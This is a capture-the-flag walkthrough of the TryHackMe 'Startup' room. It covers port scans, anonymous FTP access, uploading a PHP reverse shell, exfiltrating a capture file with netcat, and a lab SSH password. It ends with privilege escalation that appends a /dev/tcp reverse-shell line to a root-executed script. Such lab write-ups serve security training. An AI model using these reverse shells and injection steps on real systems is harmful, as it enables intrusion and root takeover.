# Startup

**Room Link:** [https://tryhackme.com/room/startup](https://tryhackme.com/room/startup)

### Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (401).png" alt=""><figcaption></figcaption></figure>



### Scan all ports

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (402).png" alt=""><figcaption></figcaption></figure>

### TCP/21 - FTP

Anonymous login is enabled

**Kali**

```
ftp $VICTIM
binary
passive
mget *
```

<figure><img src="../../.gitbook/assets/image (403).png" alt=""><figcaption></figcaption></figure>

### TCP/80 - HTTP

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (404).png" alt=""><figcaption></figcaption></figure>



### TCP/21 - FTP

**Kali**

```
git clone https://github.com/pentestmonkey/php-reverse-shell.git
cp php-reverse-shell/php-reverse-shell.php .
subl php-reverse-shell.php 
```

<figure><img src="../../.gitbook/assets/image (405).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
ftp $VICTIM
binary
passive
cd ftp
put php-reverse-shell.php 
```

**Kali**

```
nc -lvnp 1337
```

<figure><img src="../../.gitbook/assets/image (406).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (407).png" alt=""><figcaption></figcaption></figure>

Get autocomplete

```
python -c 'import pty; pty.spawn("/bin/bash")'
ctrl + Z
stty raw -echo;fg
```



### Netcat

**Kali(receiving)**

```
nc -l -p 1234 > suspicious.pcapng
```

**Victim(sending)**

```
nc -w 3 $KALI 1234 < suspicious.pcapng
```

### Wireshark

Followed the TCP stream and just kept changing it until something came up. Eventually we find lennies password.

**Kali**

```
wireshark &
```

<figure><img src="../../.gitbook/assets/image (408).png" alt=""><figcaption></figcaption></figure>

### TCP/22 - SSH

**Kali**

```
ssh lennie@$VICTIM
Password: c4ntg3t3n0ughsp1c3
```

<figure><img src="../../.gitbook/assets/image (409).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (410).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

There is a script in lennies directory that is owned by root. We can't make any changes to that script but it calls another script which we do have access to so I add a reverse shell and wait for it to be called.

**Kali**

```
nc -lvnp 1338
```

**Victim**

```
echo 'sh -i >& /dev/tcp/10.10.195.128/1338 0>&1' >> /etc/print.sh
```

<figure><img src="../../.gitbook/assets/image (411).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (412).png" alt=""><figcaption></figcaption></figure>













